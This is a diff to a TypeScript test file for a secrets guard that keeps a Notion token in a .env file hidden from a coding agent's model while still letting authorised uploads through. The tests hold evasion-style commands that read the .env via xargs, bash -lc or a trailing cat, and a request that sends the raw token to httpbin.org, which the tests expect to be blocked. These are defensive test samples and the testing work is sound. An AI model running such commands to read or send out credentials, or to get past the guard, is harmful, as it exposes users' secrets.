@@ -36,6 +36,18 @@
  * before, the wide reading of the unmapped `exec_command` input took the
  * cmd's own `cd` as moving every string and placed nothing.
  *
+ * The rg shape (2026-10-27, exclusion-flags.md X4-X6): Codex's exact
+ * first command of the live take, whose only words naming `.env` are rg
+ * NEGATED globs (`-g '!notes-app/.env'`, `--glob '!*.env'`), under the
+ * drill's PATTERN label. It now reaches the model as printed, so no path row
+ * fingerprints the notes and their upload goes through; before, a glob
+ * placed nothing (§13.12 condition 1) and the tripwire blocked the upload
+ * twice. THE ORACLE: an exclusion that does not hold (a later positive
+ * glob) shows the model only the twin's placeholder, the raw token printed
+ * by a missed read becomes its own symbol, the forms the rule does not
+ * prove (a positional naming the file, `xargs`, `bash -lc`, a later
+ * segment) stay one symbol, and the raw token to an unbound host trips.
+ *
  * Axes explicit: secrets (confidentiality ON, integrity OFF).
  */
 import { test } from "node:test";
@@ -108,9 +120,11 @@ interface Rig {
   done(): Promise<void>;
 }
 
-async function rig(session: string): Promise<Rig> {
+// `pattern`: label `notes-app/.env` as the live drill's policy does, by the
+// PATTERN `**/ws-*/notes-app/.env` (its root `/`), not a literal path.
+async function rig(session: string, opts: { pattern?: boolean } = {}): Promise<Rig> {
   const tmp = mkdtempSync(join(tmpdir(), "mandu-path-row-c6-"));
-  const ws = join(tmp, "ws");
+  const ws = join(tmp, opts.pattern ? "ws-c6a1" : "ws");
   for (const d of ["notes-app", "meetings", "secrets"]) mkdirSync(join(ws, d), { recursive: true });
   const env = join(ws, "notes-app", ".env");
   writeFileSync(env, `NOTION_TOKEN='${TOKEN}'\n`);
@@ -120,7 +134,7 @@ async function rig(session: string): Promise<Rig> {
   const policy = join(tmp, "policy.yaml");
   writeFileSync(policy, [
     "version: 1", "paths:",
-    `  - path: ${env}`, "    level: no-model", "    bindings: [api.notion.com]",
+    `  - path: ${opts.pattern ? "\"**/ws-*/notes-app/.env\"" : env}`, "    level: no-model", "    bindings: [api.notion.com]", ...(opts.pattern ? ["    recursive: false"] : []),
     `  - path: ${join(ws, "secrets", "plan.md")}`, "    level: no-model",
     "",
   ].join("\n"));
@@ -271,4 +285,81 @@ test("c6 with a leading cd (Codex, relative and absolute): the notes' upload goe
       assert.equal(r.reached.length, 1, `${form}: nothing reached httpbin.org`);
     } finally { await r.done(); }
   }
+});
+
+// demo-notion-token (Codex, 2026-10-27; exclusion-flags.md X4-X6): Codex's
+// first command, exactly as the model capture holds it. Its only words naming
+// `.env` are rg NEGATED globs, so it reads as the same search without them.
+const CODEX_RG = `pwd && rg --files -g 'AGENTS.md' -g 'notes-app/**' -g 'meetings/**' -g '!notes-app/.env' | sort && echo '--- notes-app listing ---' && ls -la notes-app && echo '--- meeting file ---' && sed -n '1,240p' meetings/2026-10-16-team-sync.md && echo '--- scripts/config references ---' && rg -n "notion|env|dotenv|token|meeting" notes-app --glob '!*.env'`;
+
+test("c6, the rg shape (Codex's exact first command, the drill's pattern label): the model sees the notes, the notes' upload goes through, the token stays a tripwire", async () => {
+  const session = "s-path-row-c6-rg";
+  const r = await rig(session, { pattern: true });
+  try {
+    const twin = (await r.guard.registerSecret({ path: join(r.ws, "notes-app", ".env"), sessionKey: session })).twin as string;
+    const field = twin.match(/\$MDU:nomodel_Read\[[0-9a-f]+\]\.NOTION_TOKEN/)![0];
+    const printed = [
+      r.ws, "AGENTS.md", "meetings/2026-10-16-team-sync.md", "notes-app/add-page.sh",
+      "--- notes-app listing ---", "total 16", "-rw-r--r-- 1 u u   58 Oct 27 12:00 .env", "-rw-r--r-- 1 u u  412 Oct 27 12:00 add-page.sh",
+      "--- meeting file ---", NOTES,
+      "--- scripts/config references ---",
+      "notes-app/add-page.sh:2:# Add a markdown file to Notion as a new page under the team's notes page.",
+      "notes-app/add-page.sh:3:set -a; . \"$here/.env\"; set +a", "",
+    ].join("\n");
+    const { shown, request } = await batch(r, session, "call_rg", CODEX_RG, printed);
+    // 1. the model sees the output as printed: no symbol, every notes line
+    assert.ok(!/\$MDU:nomodel_exec_command/.test(shown), shown);
+    for (const l of NOTES_LINES) assert.ok(shown.includes(l), `the notes reach the model: ${l}`);
+    assert.ok(!request.includes(TOKEN), "the token reaches no model request");
+
+    // the upload: the placeholder in the header, the notes in the body.
+    // Before the change the output was one symbol whose path row
+    // fingerprinted every notes line, and the §4 tripwire blocked it.
+    const up = await post(r.netPort, "http://api.notion.com/v1/pages", notionBody(), { authorization: `Bearer ${field}` });
+    assert.equal(up.status, 200, `forwarded, not refused: ${up.body}`);
+    assert.equal(r.reached.length, 1, "it reached api.notion.com");
+    assert.ok(r.reached[0]!.includes(`Bearer ${TOKEN}`), "with the real token in its header");
+    for (const l of NOTES_LINES.slice(1)) assert.ok(r.reached[0]!.includes(l), `and the notes in its body: ${l}`);
+
+    // the oracle: the raw token to an unbound host still trips (its own row)
+    const rawToken = await post(r.netPort, "http://httpbin.org/post", JSON.stringify({ t: TOKEN }));
+    assert.equal(rawToken.status, 403, rawToken.body);
+    assert.match(rawToken.body, /fingerprint tripwire/);
+    assert.equal(r.reached.length, 1, "nothing reached httpbin.org");
+  } finally { await r.done(); }
+});
+
+test("c6, the rg shape, THE ORACLE: an exclusion that does not hold still shows the model only the twin's placeholder; forms the rule does not prove stay one symbol", async () => {
+  const session = "s-path-row-c6-rg-oracle";
+  const r = await rig(session, { pattern: true });
+  try {
+    const twin = (await r.guard.registerSecret({ path: join(r.ws, "notes-app", ".env"), sessionKey: session })).twin as string;
+    const field = twin.match(/\$MDU:nomodel_Read\[[0-9a-f]+\]\.NOTION_TOKEN/)![0];
+    // 2. a later positive glob re-includes `.env`: rg reads it, and the guard
+    // serves it its twin (confined), so the placeholder is all rg can print
+    const failing = `rg -n "notion|token" notes-app -g '!notes-app/.env' -g '*'`;
+    const viaTwin = await batch(r, session, "call_rg_fail", failing, `notes-app/.env:1:NOTION_TOKEN='${field}'\nnotes-app/add-page.sh:2:# Add a markdown file to Notion as a new page under the team's notes page.\n`);
+    assert.ok(viaTwin.shown.includes(field), `the model sees the placeholder: ${viaTwin.shown}`);
+    assert.ok(!viaTwin.request.includes(TOKEN), "CONFIDENTIALITY VIOLATION: the token reached the model");
+    // and had the guard missed it (the raw token in the output), the inbound
+    // value backstop turns the registered value into its own symbol
+    const raw = await batch(r, session, "call_rg_raw", failing, `notes-app/.env:1:NOTION_TOKEN='${TOKEN}'\n`);
+    assert.ok(!raw.request.includes(TOKEN), `CONFIDENTIALITY VIOLATION: the raw token reached the model: ${raw.shown}`);
+    // 3. a positional naming the file, xargs, bash -lc: one symbol
+    for (const command of [
+      "rg -n token notes-app/.env -g '!notes-app/.env'",
+      "printf 'notes-app/.env\\n' | xargs rg -n token -g '!notes-app/.env'",
+      "bash -lc \"rg -n token -g '!x' notes-app/.env\"",
+      "rg -n token -g '!x' . ; cat notes-app/.env",
+    ]) {
+      const { shown, request } = await batch(r, session, `call_${Buffer.from(command).toString("hex").slice(0, 16)}`, command, `notes-app/.env:1:NOTION_TOKEN='${field}'\n`);
+      assert.match(shown, /\$MDU:nomodel_exec_command\[[0-9a-f]+\]/, `${command}: ${shown}`);
+      assert.ok(!request.includes(TOKEN), command);
+    }
+    // the raw token to an unbound host still trips
+    const rawToken = await post(r.netPort, "http://httpbin.org/post", JSON.stringify({ t: TOKEN }));
+    assert.equal(rawToken.status, 403, rawToken.body);
+    assert.match(rawToken.body, /fingerprint tripwire/);
+    assert.equal(r.reached.length, 0, "nothing was sent");
+  } finally { await r.done(); }
 });
